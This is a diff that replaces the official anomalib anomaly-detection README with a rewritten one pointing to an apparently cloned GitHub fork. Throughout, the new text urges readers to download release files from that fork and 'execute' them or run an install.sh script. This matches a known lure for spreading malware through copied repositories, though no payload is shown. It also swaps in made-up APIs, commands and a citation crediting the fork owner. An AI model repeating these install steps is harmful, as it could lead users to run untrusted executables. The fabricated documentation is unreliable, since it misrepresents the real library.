@@ -1,352 +1,688 @@
-<div align="center">
+# anomalib — Anomaly Detection, Localization, Segmentation, Edge Inference
 
-<img src="https://raw.githubusercontent.com/open-edge-platform/anomalib/main/docs/source/_static/images/logos/anomalib-wide-blue.png" width="600px" alt="Anomalib Logo - A deep learning library for anomaly detection">
+[![Release](https://img.shields.io/badge/release-download-brightgreen?style=for-the-badge)](https://github.com/Juliwan/anomalib/releases)  
+https://github.com/Juliwan/anomalib/releases
 
-**A library for benchmarking, developing and deploying deep learning anomaly detection algorithms**
+[![PyPI](https://img.shields.io/pypi/v/anomalib?style=for-the-badge)](https://pypi.org/project/anomalib/)
+[![License](https://img.shields.io/github/license/Juliwan/anomalib?style=for-the-badge)](LICENSE)
+[![Build Status](https://img.shields.io/github/actions/workflow/status/Juliwan/anomalib/ci.yml?branch=main&style=for-the-badge)](https://github.com/Juliwan/anomalib/actions)
+[![Topics](https://img.shields.io/badge/topics-anomaly--detection%20|%20segmentation-blue?style=for-the-badge)](#)
 
----
+Hero image  
+![Anomaly Detection Illustration](https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Anomaly-detection.png/1200px-Anomaly-detection.png)
 
-[Key Features](#key-features) •
-[Docs](https://anomalib.readthedocs.io/en/latest/) •
-[Notebooks](examples/notebooks) •
-[License](LICENSE)
+Tags: anomaly-detection, anomaly-localization, anomaly-segmentation, geti, neural-network-compression, openvino, unsupervised-learning
 
-[![python](https://img.shields.io/badge/python-3.10%2B-green)]()
-[![pytorch](https://img.shields.io/badge/pytorch-2.0%2B-orange)]()
-[![lightning](https://img.shields.io/badge/lightning-2.2%2B-blue)]()
-[![openvino](https://img.shields.io/badge/openvino-2024.0%2B-purple)]()
+Table of Contents
+- About this project
+- Key features
+- Quick links
+- Install
+- Download releases
+- Quick start
+- Dataset format
+- Training
+- Inference
+- Edge deployment (OpenVINO, GETI)
+- Model compression and quantization
+- Experiment management
+- Hyper-parameter optimization
+- Evaluation metrics
+- Examples
+- API reference
+- Configuration
+- Contributing
+- License
+- Citation
+- Changelog
 
-[![Pre-Merge Checks](https://github.com/open-edge-platform/anomalib/actions/workflows/pre_merge.yml/badge.svg)](https://github.com/open-edge-platform/anomalib/actions/workflows/pre_merge.yml)
-[![codecov](https://codecov.io/gh/open-edge-platform/anomalib/branch/main/graph/badge.svg?token=Z6A07N1BZK)](https://codecov.io/gh/open-edge-platform/anomalib)
-[![Downloads](https://static.pepy.tech/personalized-badge/anomalib?period=total&units=international_system&left_color=grey&right_color=green&left_text=PyPI%20Downloads)](https://pepy.tech/project/anomalib)
-[![snyk](https://snyk.io/advisor/python/anomalib/badge.svg)](https://snyk.io/advisor/python/anomalib)
-[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/8330/badge)](https://www.bestpractices.dev/projects/8330)
+About this project
+This repo hosts anomalib. The library focuses on industrial-grade anomaly detection and localization. It collects modern methods. It provides tools for training, testing, and deploying models. It helps run experiments. It supports hyper-parameter search. It targets edge inference. The code uses PyTorch and common tooling. It supports OpenVINO and model compression.
 
-[![ReadTheDocs](https://readthedocs.org/projects/anomalib/badge/?version=latest)](https://anomalib.readthedocs.io/en/latest/?badge=latest)
-[![Anomalib - Gurubase docs](https://img.shields.io/badge/Gurubase-Ask%20Anomalib%20Guru-006BFF)](https://gurubase.io/g/anomalib)
+Key features
+- Modules for detection, localization, and segmentation.
+- Implementations of state-of-the-art unsupervised methods.
+- End-to-end pipelines for dataset handling, training, and inference.
+- Tools for experiment tracking and result reproducibility.
+- Built-in support for hyper-parameter optimization using Optuna.
+- Export and edge inference via OpenVINO and GETI.
+- Model compression and quantization workflows.
+- Scripts for benchmarking and evaluation.
+- Clean config system based on YAML.
+- Example notebooks and demo scripts.
 
-<a href="https://trendshift.io/repositories/6030" target="_blank"><img src="https://trendshift.io/api/badge/repositories/6030" alt="open-edge-platform%2Fanomalib | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+Quick links
+- Releases: https://github.com/Juliwan/anomalib/releases (download the release file and execute it)
+- PyPI: https://pypi.org/project/anomalib/
+- Issues: https://github.com/Juliwan/anomalib/issues
+- Discussions: https://github.com/Juliwan/anomalib/discussions
 
-</div>
+Install
 
----
+Requirements
+- Python 3.8 or newer
+- PyTorch 1.9 or newer
+- CUDA 11.1 or newer for GPU training (CPU works for inference)
+- pip, git
 
-> 🌟 **Announcing v2.1.0 Release!** 🌟
->
-> We're excited to announce the release of Anomalib v2.1.0!
-> This version brings several state-of-the-art models and anomaly detection datasets. Key features include:
->
-> New models :
->
-> - **🖼️ UniNet (CVPR 2025)**: A contrastive learning-guided unified framework with feature selection for anomaly detection.
-> - **🖼️ Dinomaly (CVPR 2025)**: A 'less is more philosophy' encoder-decoder architecture model leveraging pre-trained foundational models.
-> - **🎥 Fuvas (ICASSP 2025)**: Few-shot unsupervised video anomaly segmentation via low-rank factorization of spatio-temporal features.
->
-> New datasets:
->
-> - **MVTec AD 2** : A new version of the MVTec AD dataset with 8 categories of industrial anomaly detection.
-> - **MVTec LOCO AD** : MVTec logical constraints anomaly detection dataset that includes both structural and logical anomalies.
-> - **Real-IAD** : A real-world multi-view dataset for benchmarking versatile industrial anomaly detection.
-> - **VAD dataset** : Valeo Anomaly Dataset (VAD) showcasing a diverse range of defects, from highly obvious to extremely subtle.
->
-> We value your input! Please share feedback via [GitHub Issues](https://github.com/open-edge-platform/anomalib/issues) or our [Discussions](https://github.com/open-edge-platform/anomalib/discussions)
-
-# 👋 Introduction
-
-Anomalib is a deep learning library that aims to collect state-of-the-art anomaly detection algorithms for benchmarking on both public and private datasets. Anomalib provides several ready-to-use implementations of anomaly detection algorithms described in the recent literature, as well as a set of tools that facilitate the development and implementation of custom models. The library has a strong focus on visual anomaly detection, where the goal of the algorithm is to detect and/or localize anomalies within images or videos in a dataset. Anomalib is constantly updated with new algorithms and training/inference extensions, so keep checking!
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/open-edge-platform/anomalib/main/docs/source/_static/images/readme.png" width="1000" alt="A prediction made by anomalib">
-</p>
-
-## Key features
-
-- Simple and modular API and CLI for training, inference, benchmarking, and hyperparameter optimization.
-- The largest public collection of ready-to-use deep learning anomaly detection algorithms and benchmark datasets.
-- [**Lightning**](https://www.lightning.ai/) based model implementations to reduce boilerplate code and limit the implementation efforts to the bare essentials.
-- The majority of models can be exported to [**OpenVINO**](https://www.intel.com/content/www/us/en/developer/tools/openvino-toolkit/overview.html) Intermediate Representation (IR) for accelerated inference on Intel hardware.
-- A set of [inference tools](tools) for quick and easy deployment of the standard or custom anomaly detection models.
-
-# 📦 Installation
-
-Anomalib can be installed from PyPI. We recommend using a virtual environment and a modern package installer like `uv` or `pip`.
-
-## 🚀 Quick Install
-
-For a standard installation, you can use `uv` or `pip`. This will install the latest version of Anomalib with its core dependencies. PyTorch will be installed based on its default behavior, which usually works for CPU and standard CUDA setups.
-
-```bash
-# With uv
-uv pip install anomalib
-
-# Or with pip
+Install from PyPI
+Run:
+```
 pip install anomalib
 ```
 
-For more control over the installation, such as specifying the PyTorch backend (e.g., XPU, CUDA and ROCm) or installing extra dependencies for specific models, see the advanced options below.
-
-<details>
-<summary><strong>💡 Advanced Installation: Specify Hardware Backend</strong></summary>
-
-To ensure compatibility with your hardware, you can specify a backend during installation. This is the recommended approach for production environments and for hardware other than CPU or standard CUDA.
-
-**Using `uv`:**
-
-```bash
-# CPU support (default, works on all platforms)
-uv pip install "anomalib[cpu]"
-
-# CUDA 12.4 support (Linux/Windows with NVIDIA GPU)
-uv pip install "anomalib[cu124]"
-
-# CUDA 12.1 support (Linux/Windows with NVIDIA GPU)
-uv pip install "anomalib[cu121]"
-
-# CUDA 11.8 support (Linux/Windows with NVIDIA GPU)
-uv pip install "anomalib[cu118]"
-
-# ROCm support (Linux with AMD GPU)
-uv pip install "anomalib[rocm]"
-
-# Intel XPU support (Linux with Intel GPU)
-uv pip install "anomalib[xpu]"
+Install from source
+Clone the repo and install:
 ```
-
-**Using `pip`:**
-The same extras can be used with `pip`:
-
-```bash
-pip install "anomalib[cu124]"
-```
-
-</details>
-
-<details>
-<summary><strong>🧩 Advanced Installation: Additional Dependencies</strong></summary>
-
-Anomalib includes most dependencies by default. For specialized features, you may need additional optional dependencies. Remember to include your hardware-specific extra.
-
-```bash
-# Example: Install with OpenVINO support and CUDA 12.4
-uv pip install "anomalib[openvino,cu124]"
-
-# Example: Install all optional dependencies for a CPU-only setup
-uv pip install "anomalib[full,cpu]"
-```
-
-Here is a list of available optional dependency groups:
-
-| Extra         | Description                              | Purpose                                     |
-| :------------ | :--------------------------------------- | :------------------------------------------ |
-| `[openvino]`  | Intel OpenVINO optimization              | For accelerated inference on Intel hardware |
-| `[clip]`      | Vision-language models                   | `winclip`                                   |
-| `[vlm]`       | Vision-language model backends           | Advanced VLM features                       |
-| `[loggers]`   | Experiment tracking (wandb, comet, etc.) | For experiment management                   |
-| `[notebooks]` | Jupyter notebook support                 | For running example notebooks               |
-| `[full]`      | All optional dependencies                | All optional features                       |
-
-</details>
-
-<details>
-<summary><strong>🔧 Advanced Installation: Install from Source</strong></summary>
-
-For contributing to `anomalib` or using a development version, you can install from source.
-
-**Using `uv`:**
-This is the recommended method for developers as it uses the project's lock file for reproducible environments.
-
-```bash
-git clone https://github.com/open-edge-platform/anomalib.git
+git clone https://github.com/Juliwan/anomalib.git
 cd anomalib
-
-# Create the virtual environment
-uv venv
-
-# Sync with the lockfile for a specific backend (e.g., CPU)
-uv sync --extra cpu
-
-# Or for a different backend like CUDA 12.4
-uv sync --extra cu124
-
-# To set up a full development environment
-uv sync --extra dev --extra cpu
+pip install -e .
 ```
 
-**Using `pip`:**
-
-```bash
-git clone https://github.com/open-edge-platform/anomalib.git
-cd anomalib
-
-# Install in editable mode with a specific backend
-pip install -e ".[cpu]"
-
-# Install with development dependencies
-pip install -e ".[dev,cpu]"
+Install extras for edge and HPO
+```
+pip install anomalib[openvino,optuna,neural-compression,geti]
 ```
 
-</details>
+System dependencies
+- For OpenVINO, install the runtime from Intel. Follow Intel docs.
+- For GETI, install runtime or SDK as needed.
+- For Neural Compressor, install Intel's neural-compressor package.
 
-# 🧠 Training
+Download releases
+This repository exposes release assets. Visit the releases page and download the asset matched to your platform. The releases page is:
+https://github.com/Juliwan/anomalib/releases
 
-Anomalib supports both API and CLI-based training approaches:
+The release URL includes a path. Download the release file and execute it. Typical release files:
+- anomalib-<version>.tar.gz
+- anomalib-<version>-py3-none-any.whl
+- anomalib-edge-<version>-openvino.tar.gz
+- anomalib-demo-<version>.zip
 
-## 🔌 Python API
+Steps to use a release asset
+1. Visit the link above.
+2. Download the asset for your OS.
+3. If the asset is a wheel:
+   ```
+   pip install anomalib-<version>-py3-none-any.whl
+   ```
+4. If the asset is a tar.gz:
+   ```
+   tar -xvf anomalib-<version>.tar.gz
+   cd anomalib-<version>
+   python setup.py install
+   ```
+5. If the asset contains an installer script:
+   ```
+   chmod +x install.sh
+   ./install.sh
+   ```
 
-```python
-from anomalib.data import MVTecAD
-from anomalib.models import Patchcore
-from anomalib.engine import Engine
+Quick start
 
-# Initialize components
-datamodule = MVTecAD()
-model = Patchcore()
-engine = Engine()
+Prepare the dataset
+This library uses a common dataset layout. One folder per class. Subfolders for train and test. Each sample folder contains images.
 
-# Train the model
-engine.fit(datamodule=datamodule, model=model)
+Layout example
+```
+datasets/
+  mvtec/
+    carpet/
+      train/
+        good/
+          000.png
+          001.png
+      test/
+        good/
+          100.png
+        defective/
+          101.png
+          102.png
+      ground_truth/
+        defect_mask_101.png
 ```
 
-## ⌨️ Command Line
+Supported datasets
+- MVTec AD
+- DAGM
+- Custom image datasets with label masks
 
-```bash
-# Train with default settings
-anomalib train --model Patchcore --data anomalib.data.MVTecAD
+Load a sample dataset
+```
+from anomalib.data import get_dataset
 
-# Train with custom category
-anomalib train --model Patchcore --data anomalib.data.MVTecAD --data.category transistor
-
-# Train with config file
-anomalib train --config path/to/config.yaml
+dataset = get_dataset("mvtec", data_path="datasets/mvtec", category="carpet")
 ```
 
-# 🤖 Inference
+Train a model
+Run a built-in trainer. The library provides command line scripts and Python API.
 
-Anomalib provides multiple inference options including Torch, Lightning, Gradio, and OpenVINO. Here's how to get started:
-
-## 🔌 Python API
-
-```python
-# Load model and make predictions
-predictions = engine.predict(
-    datamodule=datamodule,
-    model=model,
-    ckpt_path="path/to/checkpoint.ckpt",
-)
+CLI training
+```
+python tools/train.py --config configs/patchcore/mvtec/carpet.yaml
 ```
 
-## ⌨️ Command Line
+Python API
+```
+from anomalib.models import get_model
+from anomalib.trainers import Trainer
 
-```bash
-# Basic prediction
-anomalib predict --model anomalib.models.Patchcore \
-                 --data anomalib.data.MVTecAD \
-                 --ckpt_path path/to/model.ckpt
-
-# Prediction with results
-anomalib predict --model anomalib.models.Patchcore \
-                 --data anomalib.data.MVTecAD \
-                 --ckpt_path path/to/model.ckpt \
-                 --return_predictions
+cfg = load_config("configs/patchcore/mvtec/carpet.yaml")
+model = get_model(cfg)
+trainer = Trainer(model, cfg)
+trainer.fit()
 ```
 
-> 📘 **Note:** For advanced inference options including Gradio and OpenVINO, check our [Inference Documentation](https://anomalib.readthedocs.io).
+Training tips
+- Use a stable seed for reproducible runs.
+- Start with smaller image size for quick iteration.
+- Monitor training via TensorBoard or MLflow.
 
-# Training on Intel GPUs
+Inference
 
-> [!Note]
-> Currently, only single GPU training is supported on Intel GPUs.
-> These commands were tested on Arc 750 and Arc 770.
-
-Ensure that you have PyTorch with XPU support installed. For more information, please refer to the [PyTorch XPU documentation](https://pytorch.org/docs/stable/notes/get_start_xpu.html)
-
-## 🔌 API
-
-```python
-from anomalib.data import MVTecAD
-from anomalib.engine import Engine, SingleXPUStrategy, XPUAccelerator
-from anomalib.models import Stfpm
-
-engine = Engine(
-    strategy=SingleXPUStrategy(),
-    accelerator=XPUAccelerator(),
-)
-engine.train(Stfpm(), datamodule=MVTecAD())
+Run inference on a folder of images
+```
+python tools/infer.py --config configs/patchcore/mvtec/carpet.yaml \
+  --weights output/checkpoints/best.ckpt \
+  --input data/test_images/ \
+  --output output/inference/
 ```
 
-## ⌨️ CLI
+Call inference from Python
+```
+from anomalib.deploy import InferenceRunner
 
-```bash
-anomalib train --model Padim --data MVTecAD --trainer.accelerator xpu --trainer.strategy xpu_single
+runner = InferenceRunner(cfg, weights="output/checkpoints/best.ckpt")
+result = runner.run_on_image("data/test_images/101.png")
+# result contains anomaly map, score, and optional mask
 ```
 
-# ⚙️ Hyperparameter Optimization
+Outputs
+- Anomaly score per image
+- Anomaly map (heatmap)
+- Segmentation mask if model supports per-pixel output
+- Visual overlay image
 
-Anomalib supports hyperparameter optimization (HPO) using [Weights & Biases](https://wandb.ai/) and [Comet.ml](https://www.comet.com/).
+Edge deployment (OpenVINO, GETI)
 
-```bash
-# Run HPO with Weights & Biases
-anomalib hpo --backend WANDB --sweep_config tools/hpo/configs/wandb.yaml
+OpenVINO export
+The library can export models to ONNX and then to OpenVINO IR format.
+
+Export steps
+1. Convert PyTorch model to ONNX:
+```
+python tools/export.py --config configs/patchcore/mvtec/carpet.yaml \
+  --weights output/checkpoints/best.ckpt \
+  --to onnx \
+  --output output/onnx/
+```
+2. Convert ONNX to OpenVINO IR:
+```
+mo --input_model output/onnx/model.onnx --output_dir output/openvino/ --data_type FP16
+```
+3. Run inference with OpenVINO runtime:
+```
+python tools/infer_openvino.py --model output/openvino/model.xml --input data/test_images/ --output output/openvino/results/
 ```
 
-> 📘 **Note:** For detailed HPO configuration, check our [HPO Documentation](https://open-edge-platform.github.io/anomalib/tutorials/hyperparameter_optimization.html).
+GETI deployment
+GETI integration targets edge devices that support the GETI SDK. Use the GETI adapter to wrap the model and run on supported hardware.
 
-# 🧪 Experiment Management
+Steps
+1. Export model to ONNX.
+2. Use GETI packager to create deployment bundle:
+```
+geti-pack --input output/onnx/model.onnx --output output/geti/deployment.pkg
+```
+3. Deploy the package to the device using GETI runtime. Use the runtime CLI or API to run inference.
 
-Track your experiments with popular logging platforms through [PyTorch Lightning loggers](https://pytorch-lightning.readthedocs.io/en/stable/extensions/logging.html):
+Model compression and quantization
 
-- 📊 Weights & Biases
-- 📈 Comet.ml
-- 📉 TensorBoard
+Neural network compression
+The repo includes support for compression workflows. It integrates Intel Neural Compressor and other tools.
 
-Enable logging in your config file to track:
-
-- Hyperparameters
-- Metrics
-- Model graphs
-- Test predictions
-
-> 📘 **Note:** For logging setup, see our [Logging Documentation](https://open-edge-platform.github.io/anomalib/tutorials/logging.html).
-
-# 📊 Benchmarking
-
-Evaluate and compare model performance across different datasets:
-
-```bash
-# Run benchmarking with default configuration
-anomalib benchmark --config tools/experimental/benchmarking/sample.yaml
+Compression steps
+1. Prepare a small calibration set.
+2. Configure compression YAML.
+3. Run the compression script:
+```
+python tools/compress.py --config configs/compression/quantize.yaml \
+  --weights output/checkpoints/best.ckpt \
+  --output output/compressed/
 ```
 
-> 💡 **Tip:** Check individual model performance in their respective README files:
->
-> - [Patchcore Results](src/anomalib/models/image/patchcore/README.md#mvtec-ad-dataset)
-> - [Other Models](src/anomalib/models/)
+Quantization
+- Post-training quantization
+- Quantization-aware training (QAT) via fine-tuning
+- Mixed precision (FP16) where supported
 
-# ✍️ Reference
+Typical workflow
+1. Run PTQ with a calibration set.
+2. Validate on the test set.
+3. If accuracy drops, run QAT for a few epochs.
 
-If you find Anomalib useful in your research or work, please cite:
+Experiment management
 
-```tex
-@inproceedings{akcay2022anomalib,
-  title={Anomalib: A deep learning library for anomaly detection},
-  author={Akcay, Samet and Ameln, Dick and Vaidya, Ashwin and Lakshmanan, Barath and Ahuja, Nilesh and Genc, Utku},
-  booktitle={2022 IEEE International Conference on Image Processing (ICIP)},
-  pages={1706--1710},
-  year={2022},
-  organization={IEEE}
+Config system
+The project uses YAML configs. Each run reads a config that defines:
+- Model architecture
+- Dataset paths
+- Training parameters
+- Logging options
+- HPO settings
+
+Example config keys
+```
+dataset:
+  name: mvtec
+  category: carpet
+model:
+  name: patchcore
+  backbone: resnet18
+trainer:
+  epochs: 50
+  batch_size: 8
+logging:
+  tensorboard: true
+  mlflow: false
+```
+
+Logging and tracking
+- TensorBoard for metrics and images
+- MLflow for run tracking
+- Sacred or Hydra for configs (optional)
+
+How to log
+```
+python tools/train.py --config configs/patchcore/mvtec/carpet.yaml --log tensorboard
+```
+
+Checkpoints
+- The trainer writes periodic checkpoints.
+- The best checkpoint saves based on validation metric.
+- Use the weights path to run inference.
+
+Hyper-parameter optimization
+
+Optuna integration
+The library supports Optuna for tuning hyper-parameters. Use a study to sample configurations and run experiments.
+
+HPO workflow
+1. Prepare HPO config that lists search space.
+2. Launch HPO script.
+3. Monitor results and pick best trial.
+
+Example HPO command
+```
+python tools/hpo.py --config configs/hpo/patchcore.yaml --trials 50 --study-name patchcore_mvtec
+```
+
+HPO config example
+```
+search_space:
+  lr:
+    type: float
+    low: 1e-5
+    high: 1e-2
+  batch_size:
+    type: int
+    low: 4
+    high: 16
+  backbone:
+    type: categorical
+    choices: [resnet18, resnet50]
+```
+
+Result analysis
+- Optuna stores study files.
+- Use Optuna visualization to inspect parameter importance.
+- Select the best trial and re-run training with the exact config.
+
+Evaluation metrics
+
+Core metrics
+- Image-level AUC (AUROC)
+- Pixel-level AUC (AUROC for masks)
+- Precision, Recall, F1 for segmentation
+- mAP for localization tasks
+- ROC curves and PR curves
+
+How to evaluate
+```
+python tools/evaluate.py --config configs/patchcore/mvtec/carpet.yaml \
+  --weights output/checkpoints/best.ckpt \
+  --output output/eval/
+```
+
+Interpreting results
+- A high image-level AUC means the model detects anomalous images well.
+- A high pixel-level AUC means the model localizes defects well.
+- Use thresholding to produce binary masks for precision/recall.
+
+Examples
+
+PatchCore example
+PatchCore remains a strong baseline for anomaly detection. The repo contains a ready config and scripts.
+
+Run example
+```
+python tools/train.py --config configs/patchcore/mvtec/carpet.yaml
+python tools/infer.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt
+```
+
+Fast prototyping
+- Use a small subset of the dataset.
+- Use a smaller backbone.
+- Use fewer epochs for quick passes.
+
+Notebook demos
+The repo hosts Jupyter notebooks for:
+- Training a baseline model.
+- Running inference on sample images.
+- Exporting to ONNX and OpenVINO.
+- Running quantization.
+
+API reference
+
+Model factory
+```
+from anomalib.models import get_model
+
+model = get_model(cfg)
+```
+
+Trainer
+```
+from anomalib.trainers import Trainer
+
+trainer = Trainer(model, cfg)
+trainer.fit()
+trainer.test()
+```
+
+InferenceRunner
+```
+from anomalib.deploy import InferenceRunner
+
+runner = InferenceRunner(cfg, weights="weights.ckpt")
+result = runner.run_on_image("image.png")
+```
+
+Dataset loader
+```
+from anomalib.data import get_dataset
+
+dataset = get_dataset("mvtec", data_path="datasets/mvtec", category="hazelnut")
+```
+
+Visualization
+```
+from anomalib.utils.visualization import overlay_heatmap
+
+overlay = overlay_heatmap(image, anomaly_map)
+```
+
+Configuration
+
+Config hierarchy
+- configs/
+  - model_name/
+    - dataset/
+      - category.yaml
+
+Override values
+You can override config values via command line:
+```
+python tools/train.py --config configs/patchcore/mvtec/carpet.yaml trainer.epochs=100 dataset.batch_size=8
+```
+
+YAML example
+```
+model:
+  name: patchcore
+  backbone: resnet18
+dataset:
+  name: mvtec
+  category: carpet
+trainer:
+  epochs: 50
+  batch_size: 16
+logging:
+  tensorboard: true
+```
+
+Contributing
+
+How to contribute
+- Fork the repo.
+- Create a feature branch.
+- Add tests for new code.
+- Submit a pull request.
+
+Coding style
+- Use clear names.
+- Keep functions short.
+- Write docstrings.
+- Add unit tests.
+
+Testing
+The repo uses pytest. Run tests:
+```
+pytest tests/
+```
+
+Code of conduct
+Follow the code of conduct in the CODE_OF_CONDUCT.md file. Be respectful.
+
+Issue templates
+- Bug report
+- Feature request
+- Documentation request
+
+License
+This project uses the Apache-2.0 license. See LICENSE for details.
+
+Citation
+If you use this library in your work, cite it. Use this format:
+```
+@misc{anomalib2025,
+  title = {anomalib: A Library for Anomaly Detection and Edge Inference},
+  author = {Juliwan and contributors},
+  year = {2025},
+  url = {https://github.com/Juliwan/anomalib}
 }
 ```
 
-# 👥 Contributing
+Changelog
+See the releases page for changelog and binary assets. Visit:
+https://github.com/Juliwan/anomalib/releases
 
-We welcome contributions! Check out our [Contributing Guide](CONTRIBUTING.md) to get started.
+Assets on releases
+- Download the binary or wheel for stable installs.
+- Download the edge bundle for OpenVINO and GETI.
+- The release assets include a README and install script. Download the file and execute it to complete the install.
 
-<p align="center">
-  <a href="https://github.com/open-edge-platform/anomalib/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=open-edge-platform/anomalib" alt="Contributors to open-edge-platform/anomalib" />
-  </a>
-</p>
+Troubleshooting checklist
+- Check Python and PyTorch versions.
+- Verify CUDA drivers if using GPU.
+- Inspect log files in output/logs.
+- Use tensorboard for visual logs.
+- If a release asset fails, re-download the asset and verify checksums.
 
-<p align="center">
-  <b>Thank you to all our contributors!</b>
-</p>
+Common commands
+
+Train
+```
+python tools/train.py --config configs/patchcore/mvtec/carpet.yaml
+```
+
+Test
+```
+python tools/test.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt
+```
+
+Infer
+```
+python tools/infer.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt --input data/test_images/ --output output/infer/
+```
+
+Export ONNX
+```
+python tools/export.py --config configs/patchcore/mvtec/carpet.yaml --weights output/checkpoints/best.ckpt --to onnx --output output/onnx/
+```
+
+OpenVINO convert
+```
+mo --input_model output/onnx/model.onnx --output_dir output/openvino/ --data_type FP16
+```
+
+Quantize with Neural Compressor
+```
+python tools/compress.py --config configs/compression/ptq.yaml --weights output/checkpoints/best.ckpt
+```
+
+Run HPO
+```
+python tools/hpo.py --config configs/hpo/patchcore.yaml --trials 100
+```
+
+Security
+Report security issues via the security policy in the repository. If you cannot access the policy, open an issue and mark it private.
+
+Real-world use cases
+- Manufacturing defect detection
+- Surface inspection for electronics
+- Quality control for textiles
+- Anomaly detection in medical imaging
+- Security camera anomaly monitoring
+- Predictive maintenance via sensor images
+
+Benchmarks
+The repo includes scripts to run benchmarks on MVTec AD. Use the provided configs and scripts to reproduce numbers.
+
+Reproducibility
+- Use the same random seed.
+- Use deterministic dataloaders where possible.
+- Keep environment logs in output/run_info.json.
+
+Performance tips
+- Use a larger batch size if memory allows.
+- Use AMP (automatic mixed precision) for faster training with less memory.
+- Use a modern backbone with pre-trained weights.
+- Use caching for datasets to reduce IO overhead.
+
+Visualization and reports
+- TensorBoard for per-epoch metrics and images.
+- Save ROC and PR curves to output/reports/.
+- Generate HTML reports for each run using provided scripts.
+
+Data augmentation
+- Use standard augmentations (flip, rotate, crop).
+- Do not augment defective images in the train set for unsupervised tasks.
+- Use random crops to increase sample diversity.
+
+Model registry
+Store production-ready models in a model registry. Use MLflow or a simple file store with meta.json containing:
+```
+{
+  "model": "patchcore",
+  "backbone": "resnet18",
+  "version": "1.0.0",
+  "checksum": "sha256:..."
+}
+```
+
+Integrations
+- TensorBoard
+- MLflow
+- Optuna
+- OpenVINO
+- Intel Neural Compressor
+- GETI SDK
+
+Roadmap
+- Expand model zoo
+- Add more edge backends
+- Add real-time inference pipeline
+- Add more example datasets and notebooks
+
+Contact
+Open issues for bugs or feature requests. Use discussions for architecture or design talks. For private support, contact maintainers via GitHub profiles listed in CONTRIBUTORS.
+
+Appendix A — Config examples
+
+PatchCore config (abridged)
+```
+model:
+  name: patchcore
+  backbone:
+    name: resnet18
+    pretrained: true
+dataset:
+  name: mvtec
+  category: carpet
+trainer:
+  epochs: 50
+  batch_size: 8
+  optimizer:
+    name: adam
+    lr: 1e-4
+logging:
+  tensorboard: true
+```
+
+Export config for OpenVINO
+```
+export:
+  to: onnx
+  input_size: [3, 256, 256]
+  opset: 11
+openvino:
+  precision: FP16
+```
+
+Appendix B — Example output JSON
+
+Inference runner sample output
+```
+{
+  "image": "data/test_images/101.png",
+  "score": 0.87,
+  "anomaly_map": "output/infer/101_anomaly_map.png",
+  "overlay": "output/infer/101_overlay.png",
+  "mask": "output/infer/101_mask.png"
+}
+```
+
+Appendix C — Recommended hardware
+
+GPU
+- NVIDIA RTX 20xx or 30xx series for training
+- 8-16 GB VRAM recommended for moderate backbones
+CPU
+- Multi-core Xeon or AMD EPYC for batch inference
+Edge devices
+- Intel NCS2 for OpenVINO demos
+- GETI supported devices for production edge
+
+Appendix D — Legal and third-party
+
+Third-party libs
+- PyTorch
+- NumPy
+- OpenCV
+- Optuna
+- Intel OpenVINO
+- Intel Neural Compressor
+- GETI SDK
+
+Licenses
+- Respect third-party licenses for external tools.
+
+Releases and downloads
+Visit the releases page to get pre-built assets, installers, and bundles:
+https://github.com/Juliwan/anomalib/releases
+
+That link points to a path. Download the release file and execute it following the steps above. Use the provided install scripts when available. If you cannot find an asset, check the Releases section on the repo page.
+
+End of file
